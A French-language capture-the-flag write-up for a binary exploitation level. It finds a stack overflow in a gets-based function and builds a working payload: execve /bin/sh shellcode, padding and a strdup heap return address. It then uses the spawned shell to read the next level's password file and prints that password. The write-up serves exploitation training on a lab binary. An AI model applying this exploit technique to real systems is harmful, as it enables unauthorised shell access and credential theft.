En reprennant ce que l'on vient de voir lors du lancement du level2 on s'apercoit qu'il y a un segfault:

http://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/

$> Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

gdb nous indique cette adresse : 0x37634136 qui correspond l'offset 80

On utilise objdump pour voir les fonctions autre que main.
Il y a une fonction p qui est appelé

080484d4 <p>:
 80484d4:	55                   	push   %ebp
 80484d5:	89 e5                	mov    %esp,%ebp
 80484d7:	83 ec 68             	sub    $0x68,%esp
 80484da:	a1 60 98 04 08       	mov    0x8049860,%eax
 80484df:	89 04 24             	mov    %eax,(%esp)
 80484e2:	e8 c9 fe ff ff       	call   80483b0 <fflush@plt>
 80484e7:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 80484ea:	89 04 24             	mov    %eax,(%esp)
 80484ed:	e8 ce fe ff ff       	call   80483c0 <gets@plt>
 80484f2:	8b 45 04             	mov    0x4(%ebp),%eax
 80484f5:	89 45 f4             	mov    %eax,-0xc(%ebp)
 80484f8:	8b 45 f4             	mov    -0xc(%ebp),%eax
 80484fb:	25 00 00 00 b0       	and    $0xb0000000,%eax
 8048500:	3d 00 00 00 b0       	cmp    $0xb0000000,%eax
 8048505:	75 20                	jne    8048527 <p+0x53>
 8048507:	b8 20 86 04 08       	mov    $0x8048620,%eax
 804850c:	8b 55 f4             	mov    -0xc(%ebp),%edx
 804850f:	89 54 24 04          	mov    %edx,0x4(%esp)
 8048513:	89 04 24             	mov    %eax,(%esp)
 8048516:	e8 85 fe ff ff       	call   80483a0 <printf@plt>
 804851b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048522:	e8 a9 fe ff ff       	call   80483d0 <_exit@plt>
 8048527:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 804852a:	89 04 24             	mov    %eax,(%esp)
 804852d:	e8 be fe ff ff       	call   80483f0 <puts@plt>
 8048532:	8d 45 b4             	lea    -0x4c(%ebp),%eax
 8048535:	89 04 24             	mov    %eax,(%esp)
 8048538:	e8 a3 fe ff ff       	call   80483e0 <strdup@plt>
 804853d:	c9                   	leave
 804853e:	c3                   	ret

Elle appelle fflush, gets, printf, exit, puts et strdup.

En faisant un ltrace on peut verifier les fonctions dans lesquels notre programme passe ainsi que les adresses de retour. Pour strdup c'est:
0x0804a008		=>	08a00408	=>	\x08\xa0\x04\x08
	big			=>	little		=>	shellcode

Il n'y a pas d'appel a system donc pas de shell lancé.
Il faut en lancer nous meme et c'est faisable avec cette ligne de shellcode: \x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80
Elle fait 21 bytes et du coup on fait 80 - 21 pour avoir la place de saisir notre shellcode.

Puis on utilise la meme methode qu'avant !

$> python -c "print '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 59 + '\x08\xa0\x04\x08'" > /tmp/test1
$> cat /tmp/test1 - | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02